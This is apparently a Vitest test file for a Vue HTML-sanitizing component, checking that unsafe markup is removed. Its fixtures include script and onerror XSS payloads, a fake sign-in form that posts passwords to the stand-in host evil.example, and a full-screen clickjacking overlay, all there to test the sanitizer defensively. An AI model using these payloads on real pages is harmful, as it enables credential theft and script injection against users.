// @vitest-environment jsdom

import { render, screen } from '@testing-library/vue'
import { describe, expect, it } from 'vitest'

import SanitizedHtml from './SanitizedHtml.vue'

describe('SanitizedHtml', () => {
  it('preserves supported markup and removes executable content', () => {
    render(SanitizedHtml, {
      props: {
        as: 'span',
        html: [
          '<strong>Safe</strong>',
          '<a href="https://example.com" target="_blank" rel="noopener noreferrer">Link</a>',
          '<video controls><source src="video.mp4"></video>',
          '<img src="x" onerror="alert(1)">',
          '<script>alert(1)</script>'
        ].join('')
      },
      attrs: { 'data-testid': 'content' }
    })

    const content = screen.getByTestId('content')
    expect(content.tagName).toBe('SPAN')
    expect(screen.getByText('Safe', { selector: 'strong' })).toBeVisible()
    expect(screen.getByRole('link')).toHaveAttribute('target', '_blank')
    expect(content.innerHTML).toContain('<video controls="">')
    expect(content.innerHTML).not.toContain('onerror')
    expect(content.innerHTML).not.toContain('<script')
  })

  function renderHtml(html: string, allowInlineStyle = false) {
    render(SanitizedHtml, {
      props: { html, allowInlineStyle },
      attrs: { 'data-testid': 'content' }
    })
    return screen.getByTestId('content')
  }

  describe('authored content cannot impersonate a sign-in box', () => {
    const SIGN_IN_FORM = [
      '<form action="https://evil.example/steal" method="post">',
      '<input type="password" name="password">',
      '<button type="submit">Sign in</button>',
      '</form>'
    ].join('')

    it('drops the form, the password field, and the submit button', () => {
      expect(SIGN_IN_FORM).toContain('<form')
      expect(SIGN_IN_FORM).toContain('type="password"')
      expect(SIGN_IN_FORM).toContain('<button')

      const content = renderHtml(SIGN_IN_FORM)

      expect(content.innerHTML).not.toContain('<form')
      expect(content.innerHTML).not.toContain('<input')
      expect(content.innerHTML).not.toContain('<button')
      expect(screen.queryByRole('button')).toBeNull()
    })

    it('drops textarea and select controls', () => {
      const markup = '<textarea>x</textarea><select><option>a</option></select>'
      expect(markup).toContain('<textarea')

      const content = renderHtml(markup)

      expect(content.innerHTML).not.toContain('<textarea')
      expect(content.innerHTML).not.toContain('<select')
      expect(screen.queryByRole('textbox')).toBeNull()
      expect(screen.queryByRole('combobox')).toBeNull()
    })

    it('keeps the disabled checkbox a GFM task list renders', () => {
      const taskList =
        '<ul><li><input disabled="" type="checkbox"> todo</li></ul>'
      expect(taskList).toContain('type="checkbox"')

      renderHtml(taskList)

      // Disabled is the whole reason this one input is allowed through, so
      // assert it — otherwise dropping that condition keeps this test green.
      expect(screen.getByRole('checkbox')).toBeDisabled()
    })

    it('drops an enabled checkbox, which no task list emits', () => {
      const impostor = '<ul><li><input type="checkbox"> pick me</li></ul>'
      expect(impostor).toContain('type="checkbox"')

      renderHtml(impostor)

      expect(screen.queryByRole('checkbox')).toBeNull()
    })
  })

  describe('inline style', () => {
    const OVERLAY =
      '<div style="position:fixed;inset:0;z-index:99999">click me</div>'

    it('is stripped from authored content by default', () => {
      expect(OVERLAY).toContain('position:fixed')

      const content = renderHtml(OVERLAY)

      expect(screen.getByText('click me')).toBeInTheDocument()
      expect(content.innerHTML).not.toContain('position:fixed')
      expect(content.innerHTML).not.toContain('style=')
    })

    it('is kept when the caller opts in for generated markup', () => {
      const content = renderHtml(OVERLAY, true)

      expect(content.innerHTML).toContain('position:fixed')
    })
  })
})
